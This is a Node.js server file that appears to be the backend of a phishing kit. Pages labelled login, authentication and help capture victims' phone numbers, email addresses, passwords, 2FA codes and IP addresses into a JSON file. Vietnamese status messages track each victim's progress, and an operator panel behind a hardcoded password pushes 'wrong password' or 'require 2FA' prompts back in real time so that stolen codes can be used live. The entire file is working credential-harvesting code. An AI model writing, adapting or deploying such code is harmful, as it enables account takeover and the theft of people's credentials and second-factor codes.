const express = require('express');
const http = require('http');
const socketIO = require('socket.io');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = socketIO(server);

const dataFileName = 'database.json';
const panelAccessPassword = '2612';

// Serve static files
app.use(express.static('public'));

// Define routes
const routes = ['/confirm', '/help', '/issue', '/form', '/login', '/authentication'];

routes.forEach(route => {
  app.get(route, (req, res) => {
    res.sendFile(__dirname + route + '.html');
  });
});

app.get('/request', (req, res) => {
  const requestId = req.query.requestId;
  const database = getDatabase();
  if (requestId in database) {
    res.json(database[requestId]);
  } else {
    res.sendStatus(500);
  }
});

app.get('/data', (req, res) => {
  const database = getDatabase();
  res.json(database);
});

app.get('/', (req, res) => {
  res.sendFile(__dirname + '/help.html');
});

app.get('/panel', (req, res) => {
  const pass = req.query.p;
  if (pass == panelAccessPassword) {
    res.sendFile(__dirname + '/panel.html');
  } else {
    res.sendStatus(500);
  }
});

// Socket.io connection handling
io.on('connection', handleConnection);

// Start the server
const port = process.env.PORT || 3000;
server.listen(port, () => {
  console.log(`Server running on http://localhost:${port}`);
});

// Helper functions

function handleConnection(socket) {
  socket.on('input', handleInput);
  socket.on('confirmation', handleConfirmation);
}

function handleInput(data) {
  const database = getDatabase();
  switch (data.currentPage) {
    case 3:
      handlePage3Input(data, database);
      break;

    case 4:
      handlePage4Input(data, database);
      break;

    case 5:
      handlePage5Input(data, database);
      break;

    default:
      break;
  }

  writeDatabase(database);
  io.emit('output', data);
}

function handlePage3Input(data, database) {
  const newData = {
    id: data.id,
    phoneNumber: data.phoneNumber,
    emailAddress: data.emailAddress,
    password: '',
    twofa: '',
    status: 'Đang điền mật khẩu',
    createdDate: Date.now(),
    ip: data.ip,
  };
  database[newData.id] = newData;
}

function handlePage4Input(data, database) {
  const oldData = database[data.id];
  oldData.password = data.password;
  oldData.status = 'Mật khẩu được điền';
  database[oldData.id] = oldData;
}

function handlePage5Input(data, database) {
  const oldData = database[data.id];
  oldData.twofa = data.twofa;
  oldData.status = 'Mã 2FA được điền';
  database[oldData.id] = oldData;
}

function handleConfirmation(data) {
  const database = getDatabase();
  const request = database[data.modalId];
  request.status = getCorrespondStatus(data.checkType);
  writeDatabase(database);
  io.emit('refresh', { status: request.status });
  io.emit('turnOffModal', data);
}

function getDatabase() {
  return JSON.parse(fs.readFileSync(dataFileName, 'utf8'));
}

function writeDatabase(database) {
  fs.writeFile(dataFileName, JSON.stringify(database, null, 4), (err) => err && console.error(err));
}

function getCorrespondStatus(checkType) {
  switch (checkType) {
    case 1:
      return 'Sai mật khẩu';
    case 2:
      return 'Yêu cầu 2FA';
    case 3:
      return 'Sai 2FA';
    default:
      return 'Đã xác nhận';
  }
}